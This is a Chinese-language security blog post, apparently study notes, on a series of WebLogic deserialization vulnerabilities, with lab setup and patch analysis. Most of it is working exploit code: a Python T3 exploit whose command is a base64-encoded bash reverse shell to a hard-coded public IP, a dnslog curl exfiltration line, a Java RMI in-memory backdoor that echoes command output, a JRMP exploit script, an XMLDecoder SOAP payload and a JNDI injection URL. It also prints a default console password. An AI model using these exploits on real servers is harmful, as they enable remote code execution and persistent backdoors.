---
tags:
  - java安全
title: weblogic安全
date: 2025-03-20
---

# 环境
这个环境弄了很久，最后用的是boog的。然后他其实就多设置了一个镜像，要不然那个安装有一个依赖的时候会有问题。
https://drun1baby.top/2022/11/28/CVE-2015-4852-WebLogic-T3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/
https://boogipop.com/2023/04/26/Weblogic%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/#%E7%8E%AF%E5%A2%83-4
https://www.anquanke.com/post/id/219985    // 这里面有一个外链可以找到早期版本的weblogic
https://y4er.com/posts/weblogic-cve-2015-4852/    // y4er师傅写的也很详细

然后去orcle 官网去找适当版本的jdk。
环境的在kali里面没有弄成。
dockerfile添一点东西。

```
RUN cd /etc/yum.repos.d/  
RUN sed -i 's/mirrorlist/#mirrorlist/g' /etc/yum.repos.d/CentOS-*  
RUN sed -i 's|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|g' /etc/yum.repos.d/CentOS-*
```
docker build --build-arg JDK_PKG=jdk-8u65-linux-x64.tar.gz --build-arg WEBLOGIC_JAR=wls1036_generic.jar  -t weblogic1036jdk8u65 .
docker run -it -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic1036jdk8u65 weblogic1036jdk8u65
这个调试端口不能随便映射。要不然容易出问题。

```
/console/login/LoginForm.jsp   //登入路径。
weblogic:qaxateam01   // 账号密码
```

```
docker cp weblogic1036jdk8u65:/u01/app/oracle/middleware/modules ~/www  
docker cp weblogic1036jdk8u65:/u01/app/oracle/middleware/wlserver ~/www  
docker cp weblogic1036jdk8u65:/u01/app/oracle/middleware/coherence_3.7/lib ~/www
```
docker cp weblogic1036jdk8u65:/u01/app/oracle/middleware/wlserver/server/lib/wlfullclient.jar ~/www

然后把这些依赖全部导入lib。然后
ac ed 00 05  后的内容便是序列化的数据

# CVE-2015-4852
简单老说就是利用t3协议，发送序列化数据，然后服务端可以把数据反序列化。
抓包分析。然后利用socks编程然后把序列化数据发送过去。具体通讯的一些细节可以通过抓包获取。

```python
import socket  
import sys  
import struct  
import re  
import subprocess  
import binascii  
  
def get_payload1(gadget, command):  
    JAR_FILE = 'ysoserial.jar'  
    popen = subprocess.Popen(['java', '-jar', JAR_FILE, gadget, command], stdout=subprocess.PIPE)  
    return popen.stdout.read()  
  
def get_payload2(path):  
    with open(path, "rb") as f:  
        return f.read()  
  
def exp(host, port, payload):  
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
    sock.connect((host, port))  
  
    handshake = "t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n".encode()  
    sock.sendall(handshake)  
    data = sock.recv(1024)  
    pattern = re.compile(r"HELO:(.*).false")  
    version = re.findall(pattern, data.decode())  
    if len(version) == 0:  
        print("Not Weblogic")  
        return  
  
    print("Weblogic {}".format(version[0]))  
    data_len = binascii.a2b_hex(b"00000000") #数据包长度，先占位，后面会根据实际情况重新  
    t3header = binascii.a2b_hex(b"016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006") #t3协议头  
    flag = binascii.a2b_hex(b"fe010000") #反序列化数据标志  
    payload = data_len + t3header + flag + payload  
    payload = struct.pack('>I', len(payload)) + payload[4:] #重新计算数据包长度  
    sock.send(payload)  
  
if __name__ == "__main__":  
    host = "60.205.138.120"  
    port = 10801  
    gadget = "CommonsCollections6" #CommonsCollections1 Jdk7u21  
    command = "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC82MC4yMDUuMTM4LjEyMC8zMzg5IDA+JjEK}|{base64,-d}|{bash,-i}"  
    # command = "curl http://`whoami`.5dhwnx.dnslog.cn"  
  
    payload = get_payload1(gadget, command)  
    exp(host, port, payload)
```

简单说一下反序列化的点。 ServerChannelInputStream 继承了 ObjectInputStream。然后自身的resolveClass也没有做任何的过滤。然后就是去打的cc6了。
然后weblogic里面还有cc的依赖。然后jdk版本又比较高就容易攻击。

![image-20250319211202273](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20250319211202273.png)

![image-20250319205439044](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20250319205439044.png)

## 补丁

重写resolveClass。我这里就直接用别的师傅的图片了。

![image.png](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/1680961899151-306e1828-f1ed-4fd0-acc1-0509f6887d2d.png)

黑名单大概有这些。

![image-20250319212459095](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20250319212459095.png)

# CVE-2016-0638

一次针对CVE-2015-4852的绕过

进入/u01/app/oracle/middleware/wlserver/server/lib/   这个目录然后执行。

/java/bin/java -jar ../../../modules/com.bea.core.jarbuilder_1.7.0.0.jar

生成的 /u01/app/oracle/middleware/wlserver/server/lib/wlfullclient.jar 拖入lib。



StreamMessageImpl 实现了 Externalizable 。对其反序列化时会调用其  readExternal 方法。

里面有新的二次反序列化的点。

```java
    public void readExternal(ObjectInput var1) throws IOException, ClassNotFoundException {
        super.readExternal(var1);
        byte var2 = var1.readByte();
        byte var3 = (byte)(var2 & 127);
        if (var3 >= 1 && var3 <= 3) {
            switch (var3) {
                case 1:
                    this.payload = (PayloadStream)PayloadFactoryImpl.createPayload((InputStream)var1);
                    BufferInputStream var4 = this.payload.getInputStream();
                    ObjectInputStream var5 = new ObjectInputStream(var4);
                    this.setBodyWritable(true);
                    this.setPropertiesWritable(true);

                    try {
                        while(true) {
                            this.writeObject(var5.readObject());
```

咱们使用这个项目 https://github.com/5up3rc/weblogic_cmd 进行简单利用。

核心在于。讲我们想要反序列化的数据包了一层。StreamMessageImpl 而做到了绕过了黑名单。

![image-20250320150539752](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20250320150539752.png)

![image-20250320150703812](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20250320150703812.png)



# CVE-2016-3510

另一种绕过。

这里包了一层 MarshalledObject。

```java
    private static Object marshalledObject(Object payload) {
        MarshalledObject marshalledObject = null;
        try {
            marshalledObject = new MarshalledObject(payload);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return marshalledObject;
    }
```

具体还是上面那个项目，然后改一个设置就好。

```java
public class Main {

    public static final String JNDI_FACTORY = "weblogic.jndi.WLInitialContextFactory";
//    public static String TYPE = "streamMessageImpl";
    public static String TYPE = "marshall";
```



然后也可以打rmi二次反序列化。这里不细谈了。其实以前讲rmi的时候简单说过这个二次反序列化的点。

# RMI回显

让服务端去加载这个类。然后会调用到getServerLocation 这个方法里面。

```java
package com.boogipop.payload;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import weblogic.cluster.singleton.ClusterMasterRemote;

import javax.naming.Context;
import javax.naming.InitialContext;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.rmi.RemoteException;
import java.util.ArrayList;
import java.util.List;

public class RemoteImpl extends AbstractTranslet implements ClusterMasterRemote {
    static {
        try{
            Context ctx = new InitialContext();
            ctx.rebind("Boogipop", new RemoteImpl());
        }catch (Exception e){

        }
    }
    public static void main(String[] args) {
    }
    @Override
    public void setServerLocation(String cmd, String args) throws RemoteException {
    }
    @Override
    public String getServerLocation(String cmd) throws RemoteException {
        try {

            List<String> cmds = new ArrayList<String>();

            cmds.add("/bin/bash");
            cmds.add("-c");
            cmds.add(cmd);

            ProcessBuilder processBuilder = new ProcessBuilder(cmds);
            processBuilder.redirectErrorStream(true);
            Process proc = processBuilder.start();

            BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            StringBuffer sb = new StringBuffer();

            String line;
            while ((line = br.readLine()) != null) {
                sb.append(line).append("\n");
            }

            return sb.toString();
        } catch (Exception e) {
            return e.getMessage();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }
}

```

然后poc这样写。

```java
package com.boogipop;

import com.boogipop.serial.Reflections;
import com.boogipop.ssl.WeblogicTrustManager;
import com.boogipop.weblogic.T3ProtocolOperation;
import com.boogipop.weblogic.WebLogicOperation;
import org.apache.commons.cli.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.mozilla.classfile.DefiningClassLoader;
import weblogic.cluster.singleton.ClusterMasterRemote;
import weblogic.jndi.Environment;

import javax.naming.Context;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.*;

public class Main {
    public static final String JNDI_FACTORY = "weblogic.jndi.WLInitialContextFactory";
    public static String TYPE = "marshall";
    public static List<String> types = Arrays.asList(new String[]{"marshall", "collection", "streamMessageImpl"});
    public static String version;
    public static CommandLine cmdLine;
    private static String cmd = "whoami";
    private static byte[] bytes;

    static {
        try {
            bytes = Files.readAllBytes(Paths.get("D:\\codes\\java_code\\weblogic_cmd-my\\target\\classes\\com\\boogipop\\payload\\RemoteImpl.class"));
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    public static void main(String[] args) {
        System.setProperty("weblogic.security.allowCryptoJDefaultJCEVerification", "true");
        System.setProperty("weblogic.security.allowCryptoJDefaultPRNG", "true");
        System.setProperty("weblogic.security.SSL.ignoreHostnameVerification", "true");
        System.setProperty("weblogic.security.TrustKeybytesStore", "DemoTrust");

        Options options = new Options();
        options.addOption("H", true, "Remote Host[need set]");
        options.addOption("P", true, "Remote Port[need set]");
        options.addOption("C", true, "Execute Command[need set]");
        options.addOption("T", true, "Payload Type" + types);
        options.addOption("U", false, "Uninstall rmi");
        options.addOption("B", false, "Runtime Blind Execute Command maybe you should select os type");
        options.addOption("os", true, "Os Type [windows,linux]");
        options.addOption("https", false, "enable https or tls");
        options.addOption("shell", false, "enable shell module");
        options.addOption("upload", false, "enable upload a file");
        options.addOption("src", true, "path to src file ");
        options.addOption("dst", true, "path to dst file ");
        options.addOption("noExecPath", false, "custom execute path");
        try {
            String host = "127.0.0";
            String port = "7001";
            CommandLineParser parser = new DefaultParser();
            cmdLine = parser.parse(options, args);

            if (cmdLine.hasOption("H")) {
                host = cmdLine.getOptionValue("H");
            } else {
                HelpFormatter formatter = new HelpFormatter();
                formatter.printHelp("test", options);
                System.exit(0);
            }

            if (cmdLine.hasOption("P")) {
                port = cmdLine.getOptionValue("P");
            }

            if (cmdLine.hasOption("C")) {
                cmd = cmdLine.getOptionValue("C");
            }

            if (cmdLine.hasOption("T")) {
                TYPE = cmdLine.getOptionValue("T");
            }

            if (cmdLine.hasOption("U")) {
                System.out.println("开始删除rmi实例");
                WebLogicOperation.unInstallRmi(host, port);
                System.out.println("后门删除实例");
                System.exit(0);
            }
            String url = "t3://" + host + ":" + port;
            // 安装RMI实例
            invokeRMI(host,port);
            Environment environment = new Environment();
            environment.setProviderUrl(url);
            environment.setEnableServerAffinity(false);
            environment.setSSLClientTrustManager(new WeblogicTrustManager());
            Context context = environment.getInitialContext();
            ClusterMasterRemote remote = (ClusterMasterRemote) context.lookup("Boogipop");

            // 调用RMI实例执行命令
            String res = remote.getServerLocation(cmd);
            System.out.println(res);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    private static void invokeRMI(String host,String port) throws Exception {
        //CC6将远程恶意类打入内存
        final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});
        final Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(DefiningClassLoader.class),
                new InvokerTransformer("getDeclaredConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}),
                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),
                new InvokerTransformer("defineClass", new Class[]{String.class, byte[].class}, new Object[]{"com.boogipop.payload.RemoteImpl", bytes}),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"main", new Class[]{String[].class}}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{null}}),
                new ConstantTransformer(1)};
        final Map innerMap = new HashMap();
        // 初始化map 设置laymap
        Map<Object,Object> lazymap = LazyMap.decorate(innerMap,new ConstantTransformer(1)); //随便改成什么Transformer
        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazymap, "aaa");
        HashMap<Object, Object> hashMap=new HashMap();
        hashMap.put(tiedMapEntry,"bbb");
        innerMap.remove("aaa");
        Field factory = LazyMap.class.getDeclaredField("factory");
        factory.setAccessible(true);
        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
        factory.set(lazymap,transformerChain);
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(out);
        objOut.writeObject(hashMap);
        objOut.flush();
        objOut.close();
        byte[] payload = out.toByteArray();
        T3ProtocolOperation.send(host, port, payload);
    }
}

```

思路好巧妙。让服务端开一个rmi服务，然后让客户端去调用。然后就有了回显。

```java
ClusterMasterRemote remote = (ClusterMasterRemote) context.lookup("Boogipop");

// 调用RMI实例执行命令
String res = remote.getServerLocation(cmd);
System.out.println(res);
```



```java
transform:124, ChainedTransformer (org.apache.commons.collections.functors)
get:157, LazyMap (org.apache.commons.collections.map)
getValue:73, TiedMapEntry (org.apache.commons.collections.keyvalue)
hashCode:120, TiedMapEntry (org.apache.commons.collections.keyvalue)
hash:338, HashMap (java.util)
readObject:1397, HashMap (java.util)
invoke:-1, GeneratedMethodAccessor2 (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:497, Method (java.lang.reflect)
invokeReadObject:1058, ObjectStreamClass (java.io)
readSerialData:1900, ObjectInputStream (java.io)
readOrdinaryObject:1801, ObjectInputStream (java.io)
readObject0:1351, ObjectInputStream (java.io)
readObject:371, ObjectInputStream (java.io)
readObject:66, InboundMsgAbbrev (weblogic.rjvm)
read:38, InboundMsgAbbrev (weblogic.rjvm)
readMsgAbbrevs:283, MsgAbbrevJVMConnection (weblogic.rjvm)
init:213, MsgAbbrevInputStream (weblogic.rjvm)
dispatch:498, MsgAbbrevJVMConnection (weblogic.rjvm)
dispatch:330, MuxableSocketT3 (weblogic.rjvm.t3)
dispatch:387, BaseAbstractMuxableSocket (weblogic.socket)
readReadySocketOnce:967, SocketMuxer (weblogic.socket)
readReadySocket:899, SocketMuxer (weblogic.socket)
processSockets:130, PosixSocketMuxer (weblogic.socket)
run:29, SocketReaderRequest (weblogic.socket)
execute:42, SocketReaderRequest (weblogic.socket)
execute:145, ExecuteThread (weblogic.kernel)
run:117, ExecuteThread (weblogic.kernel)
```

```java
start:1007, ProcessBuilder (java.lang)
getServerLocation:50, RemoteImpl (com.boogipop.payload)
invoke:-1, RemoteImpl_WLSkel (com.boogipop.payload)
invoke:667, BasicServerRef (weblogic.rmi.internal)
run:522, BasicServerRef$1 (weblogic.rmi.internal)
doAs:363, AuthenticatedSubject (weblogic.security.acl.internal)
runAs:146, SecurityManager (weblogic.security.service)
handleRequest:518, BasicServerRef (weblogic.rmi.internal)
run:118, WLSExecuteRequest (weblogic.rmi.internal.wls)
execute:256, ExecuteThread (weblogic.work)
run:221, ExecuteThread (weblogic.work)
```

# CVE-2017-3248

其实还是绕过黑名单，打的是jrmp反序列化。我rmi那篇文章后面有提到

其实可以再把weblogic_cmd再给魔改一下。或者直接用python脚本

```java
from __future__ import print_function

import binascii
import os
import socket
import sys
import time


def generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client):
    # generates ysoserial payload
    command = 'java -jar {} {} {}:{} > payload.out'.format(path_ysoserial, jrmp_client, jrmp_listener_ip,
                                                           jrmp_listener_port)
    print("command: " + command)
    os.system(command)
    bin_file = open('payload.out', 'rb').read()
    return binascii.hexlify(bin_file)


def t3_handshake(sock, server_addr):
    sock.connect(server_addr)
    sock.send('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'.decode('hex'))
    time.sleep(1)
    sock.recv(1024)
    print('handshake successful')


def build_t3_request_object(sock, port):
    data1 = '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371'
    data2 = '007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'.format(
        '{:04x}'.format(dport))
    data3 = '1a7727000d3234322e323134'
    data4 = '2e312e32353461863d1d0000000078'
    for d in [data1, data2, data3, data4]:
        sock.send(d.decode('hex'))
    time.sleep(2)
    print('send request payload successful,recv length:%d' % (len(sock.recv(2048))))


def send_payload_objdata(sock, data):
    payload = '056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'
    payload += data
    payload += 'fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'
    payload = '%s%s' % ('{:08x}'.format(len(payload) / 2 + 4), payload)
    sock.send(payload.decode('hex'))
    time.sleep(2)
    sock.send(payload.decode('hex'))
    res = ''
    try:
        while True:
            res += sock.recv(4096)
            time.sleep(0.1)
    except Exception:
        pass
    return res


def exploit(dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(65)
    server_addr = (dip, dport)
    t3_handshake(sock, server_addr)
    build_t3_request_object(sock, dport)
    payload = generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client)
    print("payload: " + payload)
    rs = send_payload_objdata(sock, payload)
    print('response: ' + rs)
    print('exploit completed!')


if __name__ == "__main__":
    # check for args, print usage if incorrect
    if len(sys.argv) != 7:
        print('\nUsage:\nexploit.py [victim ip] [victim port] [path to ysoserial] '
              '[JRMPListener ip] [JRMPListener port] [JRMPClient]\n')
        sys.exit()

    dip = sys.argv[1]
    dport = int(sys.argv[2])
    path_ysoserial = sys.argv[3]
    jrmp_listener_ip = sys.argv[4]
    jrmp_listener_port = sys.argv[5]
    jrmp_client = sys.argv[6]
    exploit(dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client)
```

## 补丁

```java
protected Class<?> resolveProxyClass(String[] interfaces) throws IOException, ClassNotFoundException {
    String[] arr$ = interfaces;
    int len$ = interfaces.length;

    for(int i$ = 0; i$ < len$; ++i$) {
        String intf = arr$[i$];
        if (intf.equals("java.rmi.registry.Registry")) {
            throw new InvalidObjectException("Unauthorized proxy deserialization");
        }
    }

    return super.resolveProxyClass(interfaces);
}
```

看上面的补丁，补丁都是搭载resolveclass这里，治标不治本，黑名单罢了，就是ban掉了那个Registry，那我们不进入代理的Resolveclass就好了。

# CVE-2018-2628

紧接着下面这三个就是针对上面那个cve的绕过。

直接反序列化UnicastRef.人家有自己的readExternal，也会触发

```java
public Registry getObject(final String command) throws Exception {

    String host;
    int port;
    int sep = command.indexOf(':');
    if (sep < 0) {
        port = new Random().nextInt(65535);
        host = command;
    } else {
        host = command.substring(0, sep);
        port = Integer.valueOf(command.substring(sep + 1));
    }
    ObjID id = new ObjID(new Random().nextInt()); // RMI registry
    TCPEndpoint te = new TCPEndpoint(host, port);
    UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
    return ref;
}
```

# CVE-2018-2893

由于weblogic一直没有处理streamMessageImpl，导致CVE-2016-0638 + CVE-2018-2628 = CVE-2018-2893，用streamMessageImpl封装一下而已。

# CVE-2018-3245

RMIConnectionImpl_Stub代替RemoteObjectInvocationHandler，实际上就是找RemoteObject类的子类。https://github.com/pyn3rd/CVE-2018-3245

# CVE-2017-3506XMLDecoder

```xml
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 192.168.58.129:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 482

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java version="1.4.0" class="java.beans.XMLDecoder">
            <void class="java.lang.ProcessBuilder">
                <array class="java.lang.String" length="3">
                    <void index="0">
                        <string>/bin/bash</string>
                    </void>
                    <void index="1">
                        <string>-c</string>
                    </void>
                    <void index="2">
                        <string>touch /tmp/aaaa</string>
                    </void>
                </array>
                <void method="start"/></void>
        </java>
    </work:WorkContext>
</soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>
```

## 补丁

这里补丁在 `WorkContextXmlInputAdapter` 中添加了 `validate` 验证，限制了 `object` 标签，从而限制通过 XML 来构造类

```java
private void validate(InputStream is) {
      WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();
      try {
         SAXParser parser = factory.newSAXParser();
         parser.parse(is, new DefaultHandler() {
            public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {
               if(qName.equalsIgnoreCase("object")) {
                  throw new IllegalStateException("Invalid context type: object");
               }
            }
         });
      } catch (ParserConfigurationException var5) {
         throw new IllegalStateException("Parser Exception", var5);
      } catch (SAXException var6) {
         throw new IllegalStateException("Parser Exception", var6);
      } catch (IOException var7) {
         throw new IllegalStateException("Parser Exception", var7);
      }
   }
```

# CVE-2017-10271 

绕过方法很简单，将 `object` 修改成 `void`，也就是最开始漏洞复现的 exp

## 补丁

依然是进行黑名单判断

```java
private void validate(InputStream is) {
   WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();
   try {
      SAXParser parser = factory.newSAXParser();
      parser.parse(is, new DefaultHandler() {
         private int overallarraylength = 0;
         public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {
            if(qName.equalsIgnoreCase("object")) {
               throw new IllegalStateException("Invalid element qName:object");
            } else if(qName.equalsIgnoreCase("new")) {
               throw new IllegalStateException("Invalid element qName:new");
            } else if(qName.equalsIgnoreCase("method")) {
               throw new IllegalStateException("Invalid element qName:method");
            } else {
               if(qName.equalsIgnoreCase("void")) {
                  for(int attClass = 0; attClass < attributes.getLength(); ++attClass) {
                     if(!"index".equalsIgnoreCase(attributes.getQName(attClass))) {
                        throw new IllegalStateException("Invalid attribute for element void:" + attributes.getQName(attClass));
                     }
                  }
               }
               if(qName.equalsIgnoreCase("array")) {
                  String var9 = attributes.getValue("class");
                  if(var9 != null && !var9.equalsIgnoreCase("byte")) {
                     throw new IllegalStateException("The value of class attribute is not valid for array element.");
                  }
```



# CVE-2021-2109 JNDI

`http://127.0.0.1:7001/console/css/%252e%252e%252fconsolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://127.0.0;1:1389/aew0xy;AdminServer%22)`


to be continue




